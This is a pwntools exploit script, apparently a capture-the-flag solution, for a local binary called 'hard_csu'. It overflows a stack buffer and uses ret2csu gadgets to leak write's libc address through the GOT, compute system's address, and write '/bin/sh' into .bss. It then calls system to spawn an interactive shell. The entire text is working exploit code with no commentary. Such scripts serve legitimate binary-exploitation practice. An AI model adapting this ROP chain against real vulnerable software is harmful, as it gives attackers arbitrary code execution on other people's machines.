from pwn import *
context.log_level = 'DEBUG'

io = process("./hard_csu")
elf = ELF("./hard_csu")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

offset = 0x80 + 8

first_csu = 0x0000000000400606
second_csu = 0x00000000004005F0

def ret_csu(r12, r13, r14, r15, last):
	payload = offset * b'a'
	payload += p64(first_csu) + b'a' * 8
	payload += p64(0) + p64(1)
	payload += p64(r12)
	payload += p64(r13) + p64(r14) + p64(r15)
	payload += p64(second_csu)
	payload += b'a' * 56
	payload += p64(last)
	return payload

write_got = elf.got["write"]
start_fun = 0x400460

io.recv()
payload1 = ret_csu(write_got, 1, write_got, 8, start_fun)
print(payload1)

io.sendline(payload1)

real_write = u64(io.recv(8))

print("real_write_addr:" + hex(real_write))

libc_base = real_write - libc.symbols["write"]

system_addr = libc_base + libc.symbols["system"]

read_got = elf.got["read"]

bss_addr = 0x0000000000601028

payload2 = ret_csu(read_got, 0, bss_addr, 18, start_fun)

io.recvuntil("Hello, World\n")

io.sendline(payload2)

io.sendline(p64(system_addr) + b"/bin/sh\x00")

io.recvuntil("Hello, World\n")

payload3 = ret_csu(bss_addr, bss_addr+8, 0, 0, start_fun)

io.sendline(payload3)

io.interactive()

